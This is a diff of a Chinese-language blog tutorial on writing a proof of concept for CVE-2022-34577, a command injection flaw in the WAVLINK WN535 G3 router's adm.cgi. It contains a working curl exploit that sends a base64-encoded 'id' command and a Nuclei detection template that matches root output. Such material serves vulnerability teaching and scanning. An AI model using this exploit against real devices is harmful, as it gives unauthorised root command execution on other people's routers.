@@ -19,15 +19,15 @@
   <meta name="author" content="MaskObito">
   <meta name="keywords" content="">
   
-    <meta name="description" content="编写一个漏洞的 Proof of Concept (PoC)，并以 CVE-2022-34577 (WAVLINK WN535 G3 命令注入) 作为完美案例。  第一步：理解漏洞（情报分析）在写任何代码之前，你必须先彻底搞懂这个漏洞。我们从您提供的 info 块中提取关键情报：  漏洞名称 (Name): Command Execution in WAVLINK WN535 G3 adm.cgi">
+    <meta name="description" content="编写一个漏洞的 Proof of Concept (PoC)，并以 CVE-2022-34577 (WAVLINK WN535 G3 命令注入) 作为完美案例。  第一步：理解漏洞（情报分析）在写任何代码之前，必须先彻底搞懂这个漏洞。我们从 info 块中提取关键情报：  漏洞名称 (Name): Command Execution in WAVLINK WN535 G3 adm.cgi 解读：">
 <meta property="og:type" content="article">
 <meta property="og:title" content="POC">
 <meta property="og:url" content="http://maskobito.github.io/2025/04/17/POC/index.html">
 <meta property="og:site_name" content="MaskObito">
-<meta property="og:description" content="编写一个漏洞的 Proof of Concept (PoC)，并以 CVE-2022-34577 (WAVLINK WN535 G3 命令注入) 作为完美案例。  第一步：理解漏洞（情报分析）在写任何代码之前，你必须先彻底搞懂这个漏洞。我们从您提供的 info 块中提取关键情报：  漏洞名称 (Name): Command Execution in WAVLINK WN535 G3 adm.cgi">
+<meta property="og:description" content="编写一个漏洞的 Proof of Concept (PoC)，并以 CVE-2022-34577 (WAVLINK WN535 G3 命令注入) 作为完美案例。  第一步：理解漏洞（情报分析）在写任何代码之前，必须先彻底搞懂这个漏洞。我们从 info 块中提取关键情报：  漏洞名称 (Name): Command Execution in WAVLINK WN535 G3 adm.cgi 解读：">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-04-17T12:44:01.000Z">
-<meta property="article:modified_time" content="2025-08-31T13:28:32.423Z">
+<meta property="article:modified_time" content="2025-09-24T06:16:14.638Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -237,7 +237,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k 字
+          1.5k 字
         
       </span>
     
@@ -248,7 +248,7 @@
         
         
         
-          14 分钟
+          13 分钟
         
       </span>
     
@@ -292,7 +292,7 @@
                 
                 <p>编写一个漏洞的 Proof of Concept (PoC)，并以 <strong>CVE-2022-34577 (WAVLINK WN535 G3 命令注入)</strong> 作为完美案例。</p>
 <hr>
-<h3 id="第一步：理解漏洞（情报分析）"><a href="#第一步：理解漏洞（情报分析）" class="headerlink" title="第一步：理解漏洞（情报分析）"></a>第一步：理解漏洞（情报分析）</h3><p>在写任何代码之前，你必须先彻底搞懂这个漏洞。我们从您提供的 <code>info</code> 块中提取关键情报：</p>
+<h3 id="第一步：理解漏洞（情报分析）"><a href="#第一步：理解漏洞（情报分析）" class="headerlink" title="第一步：理解漏洞（情报分析）"></a>第一步：理解漏洞（情报分析）</h3><p>在写任何代码之前，必须先彻底搞懂这个漏洞。我们从 <code>info</code> 块中提取关键情报：</p>
 <ul>
 <li><strong>漏洞名称 (Name):</strong> Command Execution in WAVLINK WN535 G3 adm.cgi<ul>
 <li><strong>解读：</strong> 这是一个<strong>命令执行</strong>漏洞。意味着我们可以让设备执行我们想要的操作系统命令。</li>
@@ -311,7 +311,7 @@
 <hr>
 <h3 id="第二步：找到注入点和载荷（寻找作案工具）"><a href="#第二步：找到注入点和载荷（寻找作案工具）" class="headerlink" title="第二步：找到注入点和载荷（寻找作案工具）"></a>第二步：找到注入点和载荷（寻找作案工具）</h3><p>现在我们知道要在 <code>/adm.cgi</code> 上“动手脚”，但具体怎么做？</p>
 <ul>
-<li><p><strong>注入点 (Injection Point):</strong><br>漏洞的描述是“特制的POST请求”，但没说是哪个参数。这时，我们可以从您提供的 Nuclei 模板的 <code>body</code> 部分找到线索：</p>
+<li><p><strong>注入点 (Injection Point):</strong><br>漏洞的描述是“特制的POST请求”，但没说是哪个参数。这时，我们可以从 Nuclei 模板的 <code>body</code> 部分找到线索：</p>
 <figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">body: &quot;cmd=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">base64</span>(<span class="hljs-name">&#x27;id&#x27;</span>)&#125;&#125;</span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure>
 <p>这行代码揭示了最关键的信息：</p>
 <ol>
@@ -334,13 +334,13 @@
 <ol>
 <li><p><strong>准备载荷:</strong> <code>id</code> 命令的 Base64 编码是 <code>aWQ=</code>。</p>
 <ul>
-<li>你可以在 Linux&#x2F;Mac 上用命令 <code>echo -n &quot;id&quot; | base64</code> 来获取。</li>
+<li>在 Linux&#x2F;Mac 上用命令 <code>echo -n &quot;id&quot; | base64</code> 来获取。</li>
 </ul>
 </li>
 <li><p><strong>编写 <code>curl</code> 命令:</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># -X POST: 指定使用 POST 方法</span><br><span class="hljs-comment"># -H &quot;Content-Type...&quot;: 指定请求头，这在处理表单数据时通常是必需的</span><br><span class="hljs-comment"># -d &quot;cmd=aWQ=&quot;: 指定 POST 请求的 body 内容</span><br><span class="hljs-comment"># http://&lt;TARGET_IP&gt;/adm.cgi: 目标 URL</span><br><br>curl -X POST \<br>  -H <span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> \<br>  -d <span class="hljs-string">&quot;cmd=aWQ=&quot;</span> \<br>  http://&lt;TARGET_IP&gt;/adm.cgi<br></code></pre></td></tr></table></figure>
 </li>
-<li><p><strong>验证结果:</strong> 如果漏洞存在，执行上述命令后，你应该能在返回的内容中看到类似 <code>uid=0(root) gid=0(root)</code> 的字符串。</p>
+<li><p><strong>验证结果:</strong> 如果漏洞存在，执行上述命令后，能在返回的内容中看到类似 <code>uid=0(root) gid=0(root)</code> 的字符串。</p>
 </li>
 </ol>
 <h4 id="形式二：更灵活的-PoC-使用-Python-脚本"><a href="#形式二：更灵活的-PoC-使用-Python-脚本" class="headerlink" title="形式二：更灵活的 PoC - 使用 Python 脚本"></a>形式二：更灵活的 PoC - 使用 Python 脚本</h4><p>Python 脚本让 PoC 更具可读性、可重用性，并且可以加入自动化验证逻辑。</p>
@@ -352,7 +352,7 @@
 <li>安装 <code>requests</code> 库: <code>pip install requests</code>。</li>
 <li>在命令行中运行: <code>python poc.py &lt;目标设备的IP地址&gt;</code>。</li>
 </ol>
-<h4 id="形式三：自动化的-PoC-Nuclei-模板（对您提供示例的解读）"><a href="#形式三：自动化的-PoC-Nuclei-模板（对您提供示例的解读）" class="headerlink" title="形式三：自动化的 PoC - Nuclei 模板（对您提供示例的解读）"></a>形式三：自动化的 PoC - Nuclei 模板（对您提供示例的解读）</h4><p>Nuclei 模板是用于大规模、自动化扫描的 PoC。它将请求和验证逻辑声明化。</p>
+<h4 id="形式三：自动化的-PoC-Nuclei-模板"><a href="#形式三：自动化的-PoC-Nuclei-模板" class="headerlink" title="形式三：自动化的 PoC - Nuclei 模板"></a>形式三：自动化的 PoC - Nuclei 模板</h4><p>Nuclei 模板是用于大规模、自动化扫描的 PoC。它将请求和验证逻辑声明化。</p>
 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># ... (info 块) ...</span><br><span class="hljs-attr">http:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">method:</span> <span class="hljs-string">POST</span>              <span class="hljs-comment"># 1. 使用 POST 方法</span><br>    <span class="hljs-attr">path:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/adm.cgi&quot;</span> <span class="hljs-comment"># 2. 目标路径是 /adm.cgi</span><br><br>    <span class="hljs-attr">body:</span> <span class="hljs-string">&quot;cmd=<span class="hljs-template-variable">&#123;&#123;base64(&#x27;id&#x27;)&#125;&#125;</span>&quot;</span> <span class="hljs-comment"># 3. Body是cmd=... Nuclei的&#123;&#123;base64(&#x27;id&#x27;)&#125;&#125;会自动完成编码</span><br><br>    <span class="hljs-attr">headers:</span><br>      <span class="hljs-attr">Content-Type:</span> <span class="hljs-string">application/x-www-form-urlencoded</span> <span class="hljs-comment"># 请求头</span><br>      <br>    <span class="hljs-attr">matchers-condition:</span> <span class="hljs-string">and</span>    <span class="hljs-comment"># 4. 验证条件：下面的两个 matcher 必须同时满足</span><br>    <span class="hljs-attr">matchers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">word</span><br>        <span class="hljs-attr">words:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;uid=&quot;</span>             <span class="hljs-comment"># 5. 第一个条件：响应内容中必须包含 &quot;uid=&quot;</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;gid=&quot;</span>             <span class="hljs-comment">#    和 &quot;gid=&quot;</span><br>        <span class="hljs-attr">part:</span> <span class="hljs-string">body</span><br>        <br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">word</span><br>        <span class="hljs-attr">words:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;&lt;html&gt;&quot;</span>           <span class="hljs-comment"># 6. 第二个条件：响应内容中不能包含 &quot;&lt;html&gt;&quot;</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;&lt;script&gt;&quot;</span>         <span class="hljs-comment">#    或 &quot;&lt;script&gt;&quot;</span><br>        <span class="hljs-attr">part:</span> <span class="hljs-string">body</span><br>        <span class="hljs-attr">negative:</span> <span class="hljs-literal">true</span>         <span class="hljs-comment">#    negative: true 的意思是“不包含”</span><br></code></pre></td></tr></table></figure>
 <p>这个 <code>negative: true</code> 的匹配器非常聪明，它排除了那些虽然返回错误但可能会反射我们输入内容的正常HTML页面，从而大大降低了误报率。</p>
 <hr>
@@ -363,7 +363,6 @@
 <li><strong>构建请求：</strong> 使用 <code>curl</code>、Python 或其他工具发送构造好的请求。</li>
 <li><strong>验证结果：</strong> 检查响应中是否包含你预期的特征（如<code>uid=</code>、特定的延迟、弹窗等）。</li>
 </ol>
-<p>希望这个从分析到实践的完整流程能帮助您掌握如何编写 PoC！</p>
 
                 
               </div>
@@ -371,6 +370,27 @@
             <hr/>
             <div>
               <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%B7%A5%E5%85%B7/" class="category-chain-item">工具</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
   
   
 </div>
